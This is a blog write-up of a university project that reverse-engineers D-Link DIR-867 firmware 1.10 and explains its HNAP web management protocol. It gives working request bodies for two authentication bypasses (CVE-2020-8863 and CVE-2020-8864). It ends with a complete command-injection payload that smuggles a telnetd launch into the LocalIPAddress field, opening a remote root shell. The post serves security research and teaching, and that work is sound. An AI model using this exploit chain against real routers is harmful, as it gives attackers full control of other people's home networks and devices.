---
layout: post
title: Playing with DIR-867
tags: [Linux]
---
So I get the shell of DIR-867. I didn’t do that on purpose, it was a project of one of my courses. Anyway, let’s hop in.

## DIR-867
{% include aligner.html images="posts/2020-11-29-playing-with-dir867/router.png" column=1 %}

A 2018 consumer-level 802.11 ac-compatible Wi-Fi router. Usually the shell is available for industrial-level devices using telnet, but not for consumer-level devices.

In this article, I’ll tell you what’s wrong with the 1.10 version firmware and how I investigated it.

## What’s inside the firmware
To analyze it, first I have to take a look at what’s inside the firmware. I grabbed it from the official site and tried to `binwalk` it.

{% include aligner.html images="posts/2020-11-29-playing-with-dir867/inside-1.png" column=1 %}

Of course it was encrypted.

Then somehow I found a [PoC](https://github.com/0xricksanchez/dlink-decrypt) for decrypting D-Link firmware. It worked perfectly. Now I can look deep inside.

{% include aligner.html images="posts/2020-11-29-playing-with-dir867/inside-2.png" column=1 %}

Looking for what happened during boot, let’s start from `/etc_ro/inittab`
```
::sysinit:/etc_ro/rcS
ttyS1::respawn:/bin/sh
```
`rcS` looks suspicious. Take a look.
```sh
#!/bin/sh
mount -a
mkdir -p /var/run
makedevlinks.sh
cat /etc_ro/motd > /dev/console
nvram_daemon&
#goahead&
init_system start

#for telnet debugging
telnetd

#for syslogd
mkdir -p /var/log
```
`init_system`, that should be it. It’s an executable. After spending some time on Ghidra, I found something interesting.
```c
void FUN_00400e50(void)
{
  do_system("internet.sh");
  do_system("/etc_ro/lighttpd/www/cgi-bin/wireless.cgi init");
  do_system("/etc_ro/lighttpd/www/cgi-bin/firewall.cgi init");
  do_system("/etc_ro/lighttpd/www/cgi-bin/adm.cgi init");
  do_system("/etc_ro/lighttpd/www/cgi-bin/internet.cgi init");
                    /* WARNING: Could not recover jumptable at 0x00400ee8. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  do_system("/etc_ro/lighttpd/www/cgi-bin/qos.cgi init");
  return;
}
```
That’s some entry points! Unfortunately, no file mentioned above were found.

The router uses `lighttpd` to provide http services. Let’s take a look at the config file.
```conf
fastcgi.server = (
        "/HNAP1/" =>
        ((
                "socket" => "/var/prog.fcgi.socket-0",
                "check-local" => "enable",
                "bin-path" => "/bin/prog.cgi",
                "idle-timeout" => 10,
                "min-procs" => 1,
                "max-procs" => 1
        )),
        ".fcgi" =>
        ((
                "socket" => "/var/prog.fcgi.socket-0",
                "check-local" => "enable",
                "bin-path" => "/bin/prog.cgi",
                "idle-timeout" => 10,
                "min-procs" => 1,
                "max-procs" => 1
        ))
)
```
Jackpot! `prog.cgi` is the backend of the web server. We’ll take a look at it later. There’s a strange(?) route `/HNAP1/`. Let me introduce it.

## HNAP
> Home Network Administration Protocol (HNAP) is a proprietary network protocol invented by Pure Networks, Inc. and acquired by Cisco Systems which allows identification, configuration, and management of network devices.

### How-to
A typical HNAP request contains 4 important parts.
- SOAPAction
- Body
- Cookie
- HNAP_AUTH

#### SOAPAction

It indicates what command will be executed. It is in the form of `"http://purenetworks.com/HNAP1/<Command>"`.

All actions require authentication, except `GetDeviceSettings`, which returns the basic information of router, including what `SOAPAction`s are available.

#### Body

The body is a XML string providing details of the command to be executed. The template of all actions are in `/etc_ro/lighttpd/www/web/hnap`.

#### Authentication

The last 2 components are related to authentication process.

A typical login routine includes 3 stages and uses the following XML template.

{% include aligner.html images="posts/2020-11-29-playing-with-dir867/auth.png" column=1 %}

*The blue ones are requests from client, and the orange one is response from router.*

```xml
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://purenetworks.com/HNAP1/">
      <Action></Action>
      <Username></Username>
      <LoginPassword></LoginPassword>
      <Captcha></Captcha>
    </Login>
  </soap:Body>
</soap:Envelope>
```
`Cookie` is a string generated randomly by server, serving as the identity of current user. `Challenge` and `PublicKey` are used below.

The form of `HNAP_AUTH` is `<hmac_md5(PrivateKey, SOAPAction+Unix epoch in milliseconds)> <Unix epoch in milliseconds>`. It is used for both authentication and anti-replay attack. The implementation looks like
```py
def HNAP_AUTH(SOAPAction: str, privateKey: str) -> str:
  t = str(math.floor(time.time()*1000))
  print(f'time: {t}')
  m = f'"http://purenetworks.com/HNAP1/{SOAPAction}"'
  print(f'SOAPAction: {m}')
  auth = hmac_md5(bytes(privateKey, 'ascii'), bytes(t+m, 'ascii'), 'md5').hexdigest().upper()
  print(f'auth: {auth}')
  print(f'HNAP_AUTH: {auth} {t}')
  return f'{auth} {t}'
```
`PrivateKey` is generated by `hmac_md5(PublicKey+Password, Challenge)`. `Challenge` and `PublicKey` returned by router are used here.

Btw, my goal is remote code execution, so using HNAP is probably the way to do so.

But wait a second. How can I get authenticated without knowing the password?

## What’s wrong with authentication
There are 2 CVE’s to bypass the authentication.

### CVE-2020-8863
> […] bypass authentication on affected installations of D-Link DIR-867, […], routers with firmware 1.10B04. […] The specific flaw exists within the handling of HNAP login requests. The issue results from the lack of proper implementation of the authentication algorithm. […]

There’s a hidden option in `Login.xml`, which is implemented in `prog.cgi`.
```c
...
if ((PrivateLogin == (char *)0x0) || (iVar1 = strncmp(PrivateLogin,"Username",8), iVar1 !=0)) {
  FUN_004205fc(acStack204,0x40); // get password from nvram
}
else {
  strncpy(acStack204,Username,0x40);
}
...
```
If `PrivateLogin` doesn’t exist or its value `PrivateLogin` isn’t `"Username"`, password stored in the nvram will be used in `PrivateKey` production.

If `PrivateLogin` exists **AND** its value is `"Username"`, the username (`Admin`) will be used in `PrivateKey` production **instead of the stored password**.

In other words, if I include `<PrivateLogin>Username</PrivateLogin>` in my login request, `PrivateKey` will be `hmac_md5(PublicKey+'Admin', Challenge)` instead of the original implementation.

The following request body is a PoC.
```xml
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xmlns:xsd="http://www.w3.org/2001/XMLSchema"xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://purenetworks.com/HNAP1/">
      <Action>request</Action>
      <Username>Admin</Username>
      <LoginPassword></LoginPassword>
      <Captcha></Captcha>
      <PrivateLogin>Username</PrivateLogin>
    </Login>
  </soap:Body>
</soap:Envelope>
```
So I control the construction of `PrivateKey`, which means `HNAP_AUTH` is ready. Now how do I deal with the second stage of login?

### CVE-2020-8864
> […] bypass authentication on affected installations of D-Link DIR-867, […], routers with firmware 1.10B04. […] The specific flaw exists within the handling of HNAP login requests. The issue results from the lack of proper handling of empty passwords. […]

This one is quite simple.
```c
...
len = strlen(LoginPassword);
iVar1 = strncmp(acStack864,LoginPassword,len);
...
```
If `strlen(LoginPassword) == 0`, the `strncmp` is broken since it’ll always return `0`.

The following request body is a PoC.
```xml
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <Login xmlns="http://purenetworks.com/HNAP1/">
      <Action>login</Action>
      <Username>Admin</Username>
      <LoginPassword></LoginPassword><!-- Keep This Empty -->
      <Captcha></Captcha>
    </Login>
  </soap:Body>
</soap:Envelope>
```
Now we are authenticated and good to go. Let’s find some place to do something bad.

## Command injection
### `system()`
Let’s take a look at the most common one.

{% include aligner.html images="posts/2020-11-29-playing-with-dir867/system.png" column=1 %}

Well… Bad luck on this one. I found one spot that seemed exploitable, which in fact input were sanitized.
```c
...
iVar2 = tbsCheckHostIpEx(IPAddress); // sanitize
if ((iVar2 == 0) || (iVar2 = tbsCheckMaskEx(SubnetMask), iVar2 == 0)) {
  local_130 = 0x18; // ERROR
}
...
if (6 < sVar8) {
  sprintf(acStack140,"echo %s >/proc/ipinfo/ip_addr",__s);
  system(acStack140);
}
...
```

### `FCGI_popen()`
It’s a `popen()` wrapper from FastCGI, implemented as following
```c
FCGI_FILE *FCGI_popen(const char *cmd, const char *type)
{
    FILE * file = popen(cmd, type);
    FCGI_FILE * fcgi_file = FCGI_OpenFromFILE(file);

    if (file && !fcgi_file)
        pclose(file);

    return fcgi_file;
}
```

> The popen() function opens a process by creating a pipe, forking, and **invoking the shell**.

Going through the call tree, I found this
```c
...
snprintf(acStack136,0x40,"arp | grep %s | awk \'{printf $4}\'",LocalIPAddress);
iVar1 = FCGI_popen(acStack136,&DAT_004c11f4);
...
```
which is called here
```c
...
snprintf(req,0x100,"/SetVirtualServerSettings/VirtualServerList/VirtualServerInfo:%d/%s",local_415c,"LocalIPAddress");
LocalIPAddress = webGetVarString(param_1,req);
if (LocalIPAddress == 0) {
  responseStat = 0xc;
  goto LAB_00455d24;
}

...

iVar3 = strcmp(Enabled,"true");
if ((((iVar3 == 0) && (LocalIPAddress != 0)) && (iVar3 = strcmp(InternalPort,"9"), iVar3 ==0)) && (iVar3 = strcmp(ProtocolType,"UDP"), iVar3 == 0)) {
  local_4154 = local_4154 + 1;
  iVar3 = FUN_00454e5c(LocalIPAddress,InternalPort,ProtocolType,auStack16676,local_4154);
  if (iVar3 == -1) {
    responseStat = 0xc;
    goto LAB_00455d24;
  }
}
...
```
I love unfiltered inputs.

This is triggered by SOAPAction `SetVirtualServerSettings`. If

- `Enabled` == `true`
- `LocalIPAddress` not empty
- `InternalPort` == `9`
- `ProtocolType` == `UDP`

then the function is called and `FCGI_popen()` is executed.

The final payload looks like this
```xml
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xmlns:xsd="http://www.w3.org/2001/XMLSchema"xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SetVirtualServerSettings>
      <VirtualServerList>
        <VirtualServerInfo>
          <Enabled>true</Enabled>
          <VirtualServerDescription>TEST</VirtualServerDescription>
          <ExternalPort>123</ExternalPort>
          <InternalPort>9</InternalPort>
          <ProtocolType>UDP</ProtocolType>
          <ProtocolNumber>6</ProtocolNumber>
          <LocalIPAddress>; telnetd -l sh -b "0.0.0.0"; arp | grep 192.168.0.106 | awk \"{printf $4}\"</LocalIPAddress>
          <ScheduleName>Always</ScheduleName>
        </VirtualServerInfo>
      </VirtualServerList>
    </SetVirtualServerSettings>
  </soap:Body>
</soap:Envelope>
```